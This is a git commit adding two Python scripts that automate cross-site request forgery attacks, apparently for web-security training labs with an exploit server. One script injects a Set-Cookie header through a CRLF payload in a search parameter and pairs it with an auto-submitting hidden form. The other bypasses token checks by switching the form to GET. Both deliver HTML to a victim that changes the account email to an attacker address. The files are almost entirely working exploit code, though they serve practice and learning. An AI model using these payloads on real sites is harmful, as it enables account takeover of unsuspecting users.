6af8fe914efc7f9ef7acd9ed4e4575391d52bb1d
Mohammed Hawary <01022823818l@gmail.com>
2023-08-15 00:09:21 +0300

    15/08/2023

---
+++ CSRF/CSRF_where_token_is_tied_to_non_session_cookie.py
@@ -0,0 +1,63 @@
+                            # not ended
+import requests
+import urllib3
+from sys import argv
+import os
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def get_website_urls():
+        if len(argv) != 5:
+                print(f"[+] usage {argv[0]} <url> <exploit server url> <csrf> <csrfKey>")
+                print(f"[+] example {argv[0]} 'http://example.com' 'http://exploit.server.com' '1lP9MvjfLcOBF0XTqFEvZDPeXiZqHGmm' 'cUa3udRgoFgyZoLFE2EuuJlj1ipII5YT'")
+                exit(-1)
+        if argv[1][-1] == '/' or argv[2][-1] == '/':
+                url = argv[1][:-1]
+                exlpoit_server = argv[2][:-1]
+                csrf = argv[3]
+                csrfKey = argv[4]
+        else:
+                url = argv[1]
+                exlpoit_server = argv[2]
+                csrf = argv[3]
+                csrfKey = argv[4]
+        return url, exlpoit_server, csrf, csrfKey
+
+
+def send_to_exploit_server():
+    email = 'attacker@attack.com'
+    change_email_path = '/my-account/change-email'
+    url, exlpoit_server, csrf, csrfKey = get_website_urls()
+    action = url + change_email_path
+    set_csrf_key_payload = url + f'/?search=attack%0d%0aSet-Cookie:csrfKey={csrfKey}'
+    html_code = f'<html>\
+                      <body>\
+                      <script>history.pushState(\'\', \'\', \'/\')</script>\
+                        <form action="{action}" method="POST">\
+                          <input type="hidden" name="email" value="{email}" />\
+                          <input type="hidden" name="csrf" value="{csrf}" />\
+                          <input type="submit" value="Submit request" />\
+                        </form>\
+                            <img src="{set_csrf_key_payload}" onerror="document.forms[0].submit();">\
+                      </body>\
+                  </html>'
+    params = {
+        "urlIsHttps":"on",
+        "responseFile":"/exploit",
+        "responseHead":"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
+        "responseBody":html_code,
+        "formAction":"DELIVER_TO_VICTIM"
+    }
+    r = requests.post(exlpoit_server, data=params)
+
+    if 'Congratulations' in r.text:
+        print("[+] attack successfully")
+    else:
+        print("[-] attack unsuccessfully")
+        print("[-] please use valid csrf token and csrfKey")
+
+
+
+print("[!] don't forget login to lab before runing this script")
+print("[+] Starting attack")
+send_to_exploit_server()
---
+++ CSRF/CSRF_where_token_validation_depends_on_request_method.py
@@ -0,0 +1,56 @@
+import requests
+import urllib3
+from sys import argv
+import os
+
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def get_website_urls():
+        if len(argv) != 3:
+                print(f"[+] usage {argv[0]} <url> <exploit server url>")
+                print(f"[+] example {argv[0]} 'http://example.com' 'http://exploit.server.com'")
+                exit(-1)
+        if argv[1][-1] == '/' or argv[2][-1] == '/':
+                url = argv[1][:-1]
+                exlpoit_server = argv[2][:-1]
+        else:
+                url = argv[1]
+                exlpoit_server = argv[2]
+        return url,exlpoit_server
+
+def send_to_exploit_server():
+    email = 'attacker@attack.com' 
+    change_email_path = '/my-account/change-email'
+    url,exlpoit_server = get_website_urls()
+    action = url + change_email_path
+    html_code = f'<html>\
+                      <body>\
+                      <script>history.pushState(\'\', \'\', \'/\')</script>\
+                        <form action="{action}" method="GET">\
+                          <input type="hidden" name="email" value="{email}" />\
+                          <input type="submit" value="Submit request" />\
+                        </form>\
+                        <script>\
+                          document.forms[0].submit();\
+                        </script>\
+                      </body>\
+                  </html>'
+    params = {
+        "urlIsHttps":"on",
+        "responseFile":"/exploit",
+        "responseHead":"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
+        "responseBody":html_code,
+        "formAction":"DELIVER_TO_VICTIM"
+    }
+    r = requests.post(exlpoit_server, data=params)
+
+    if 'Congratulations' in r.text:
+        print("[+] attack successfully")
+    else:
+        print("[-] attack unsuccessfully")
+
+
+print("[!] don't forget login to lab before runing this script")
+print("[+] Starting attack")
+send_to_exploit_server()
